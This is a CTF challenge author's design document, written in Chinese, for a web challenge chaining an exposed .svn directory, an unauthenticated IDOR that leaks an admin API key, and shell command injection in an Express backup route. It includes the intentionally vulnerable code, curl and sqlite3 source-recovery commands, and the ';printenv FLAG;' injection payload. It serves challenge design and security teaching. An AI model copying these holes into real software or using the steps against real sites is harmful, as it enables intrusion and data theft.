# web_version —— 出题人文档（玩家不可见）

> 一条链把三个考点串起来：**`.svn` 源码泄露 → 代码审计发现越权 → 命令注入 RCE
> 读环境变量**。前半段考信息收集与版本控制原理，后半段考白盒审计与拼接命令的
> 利用，避免"泄露即结束"的一步题。

## 一、题目定位

| 项 | 值 |
|---|---|
| 分类 | Web |
| 难度 | 中等 |
| 技术栈 | Node.js + Express 4（`node:20-alpine`） |
| 主要考点 | `.svn` 元数据泄露、Subversion 工作副本格式（`wc.db` + pristine） |
| 次要考点 | 代码审计、IDOR 水平越权、命令拼接注入（RCE）、读环境变量拿动态 flag |
| flag | `HCTF{...}`，平台注入 `FLAG` 环境变量，仅可通过 RCE 读取 |
| 附件 | 无（线上靶机） |

## 二、环境架构

发布面板是个纯 Express 服务，进程监听 `3000`。`src/app/` 是项目源码，最终镜像
里它是**一个真实的 SVN 工作副本**——`/app/.svn/` 保留在磁盘上，`server.js` 又把
它挂到了 Web 根目录的 `/.svn`：

```js
// src/app/server.js
app.use('/.svn', express.static(path.join(__dirname, '.svn'), { dotfiles: 'allow' }));
```

`dotfiles: 'allow'` 是故意的错误配置：`express.static` 默认会忽略点文件，这里为了
让构建机"读取元数据"而放开了。于是 `GET /.svn/wc.db` 可直接下载。

镜像构建用 `svnbuilder` 阶段本地建库、`svn import`、`svn checkout`，因此 `.svn`
是货真价实的 1.7+ 单库（single-db）格式，而不是手工摆的假目录：

```dockerfile
# src/Dockerfile
RUN svnadmin create /build/repo \
 && svn import /build/app file:///build/repo/trunk -m "release panel 1.4.2" \
 && svn checkout file:///build/repo/trunk /build/wc
```

## 三、漏洞点

### 1) `.svn` 元数据泄露（信息泄露）

- 端点：`GET /.svn/wc.db`、`GET /.svn/pristine/<xx>/<sha1>.svn-base`
- 成因：`server.js` 显式把 `.svn` 目录静态开放，且未在任何入口清理版本控制目录。
- 影响：整份后端源码（`server.js`、`routes/*.js`）可被完整还原，为后续审计铺路。

### 2) IDOR 水平越权（代码审计）

```js
// src/app/routes/user.js:8
router.get('/profile/:id', (req, res) => {
  const id = Number.parseInt(req.params.id, 10);
  const user = users.find((u) => u.id === id);
  if (!user) return res.status(404).json({ error: 'user not found' });
  res.json({ id: user.id, username: user.username, role: user.role, apiKey: user.apiKey });
});
```

`/api/profile/:id` 只按路径参数查表，**没有任何登录态或属主校验**，而返回体里带
着 `apiKey` 字段。管理员固定是 `id=1`（`server.js` 的启动种子），于是一个未认证
请求 `GET /api/profile/1` 就能读到管理员的 16 字节随机 `apiKey`。

> 设计说明：`apiKey` 之所以不在泄露的源码里写死、也不落盘，就是为了强制选手必须
> 真正调用越权接口去"取"，而不是"读文件即得"。源码只告诉你"管理员有 apiKey"，
> 值要你自己越权拿。

### 3) 命令拼接注入 RCE（代码审计）

```js
// src/app/routes/admin.js:18
router.post('/backup', (req, res) => {
  const key = req.get('x-api-key') || '';
  const admin = users.find((u) => u.role === 'admin' && apiKeyMatches(key, u.apiKey));
  if (!admin) return res.status(403).json({ error: 'admin api key required' });

  const target = (req.body && req.body.target) || '/srv/www';
  exec(`tar -czf /tmp/release_${Date.now()}.tar.gz ${target}`, (err, stdout, stderr) => {
    res.json({ ok: !err, stdout, stderr });
  });
});
```

拿到管理员的 `apiKey` 后即可过鉴权。`target` 未做任何转义就拼进 `exec` 的 shell
命令，`;`、`$()`、反引号均可注入；且回调把 `stdout` 原样返回，注入 `printenv`
即可直接回显 flag。flag 只存在于容器环境变量，没有文件可读，这也是逼选手走到
RCE 的设计。

## 四、攻击链总览

```
GET /.svn/wc.db                         →  下载工作副本数据库
  └─ sqlite3 解析 NODES 表               →  枚举受版本控制的文件
GET /.svn/pristine/<xx>/<sha1>.svn-base →  还原 server.js / routes/*.js
  └─ 审计发现 /api/profile/:id           →  无鉴权的 IDOR，返回 apiKey
GET /api/profile/1                      →  读到 admin 的 apiKey
  └─ 审计发现 /admin/backup              →  鉴权后拼接 target 进 shell
POST /admin/backup  X-Api-Key: <key>
  body {"target":";printenv FLAG;"}     →  命令注入，回显 HCTF{...}
```

## 五、SVN 泄露的还原方法

`.svn` 为 SVN 1.7+ 的 single-db 格式，关键有两处：

- `.svn/wc.db`：SQLite 数据库，`NODES` 表记录每个受控文件的仓库路径与校验和
  （`checksum` 形如 `$sha1$<40 位十六进制>`）。
- `.svn/pristine/<前两位>/<sha1>.svn-base`：按内容哈希存放的原始文件，还原源码取
  这里。

手工还原：

```bash
curl -s http://HOST:3000/.svn/wc.db -o wc.db
sqlite3 wc.db "SELECT local_relpath, checksum FROM NODES WHERE op_depth=0 AND checksum IS NOT NULL;"
# checksum = $sha1$ab12...  →  文件在 /.svn/pristine/ab/ab12....svn-base
curl -s http://HOST:3000/.svn/pristine/ab/ab12....svn-base -o server.js
```

也可直接用现成工具，如 `dvcs-ripper` 的 `rip-svn.pl`：

```bash
./rip-svn.pl -u http://HOST:3000/.svn/ -o loot
```

## 六、flag 约定

- 真 flag：`HCTF{...}`，**动态**，由 ret2shell 平台在容器启动时注入 `FLAG`
  环境变量；`src/` 不写死 flag，也不落盘。
- 获取方式：`POST /admin/backup` 注入 `printenv FLAG`，响应 JSON 的 `stdout`
  字段即 flag。
- 本题**无蜜罐/假 flag**，不使用 `fflag{}`。
- 本地复现可自定演示值：

  ```bash
  docker build -t version ./src
  docker run -d -p 3000:3000 -e FLAG='HCTF{demo_svn_leak_2_rce}' version
  ```

## 七、出题人配置点

1. **flag**：无需改源码，部署时注入 `FLAG` 环境变量。
2. **端口**：`server.js` 读 `process.env.PORT`，默认 `3000`。
3. **管理员 `apiKey`**：每次启动由 `crypto.randomBytes(16)` 生成，无需配置，重启
   即轮换（reset 后旧 key 失效，属预期行为）。
4. **随源码泄露的文件范围**：由 `src/Dockerfile` 中 `COPY app/` 决定，即
   `server.js`、`routes/`、`public/`、`package.json` 全部进入工作副本。

## 八、验收（本地）

```bash
docker build -t version ./src
docker run -d --rm -p 3000:3000 -e FLAG='HCTF{demo_svn_leak_2_rce}' version
python3 writeup/exp.py http://127.0.0.1:3000
# 期望输出：HCTF{demo_svn_leak_2_rce}
```

`exp.py` 完整跑通三步链：下载 `.svn/wc.db` → 还原源码并审计出管理员 `id`（也可
直接按源码约定请求 id=1）→ 越权取 `apiKey` → 注入 `printenv FLAG` 并回显。
人工复核请对照 `wp.md`。

## 九、防非预期

- **直接猜 `/api/profile/1`**：不依赖 `.svn` 即可完成，属可接受的"运气解"；但
  `/admin/backup` 这类非常规路径名、以及管理员 `apiKey` 的用途，没有源码几乎
  无从下手，整体仍以泄露为最优路径。
- **只读源码找硬编码 flag**：源码中无 flag，`apiKey` 也为运行时随机，泄露本身
  不给分，必须走到 RCE。
- **`svn` 工具不可用于线上**：只暴露工作副本目录，未暴露 svnadmin 仓库
  （`/build/repo`），无法 `svn log` 历史或直接 checkout，只能解析 pristine。
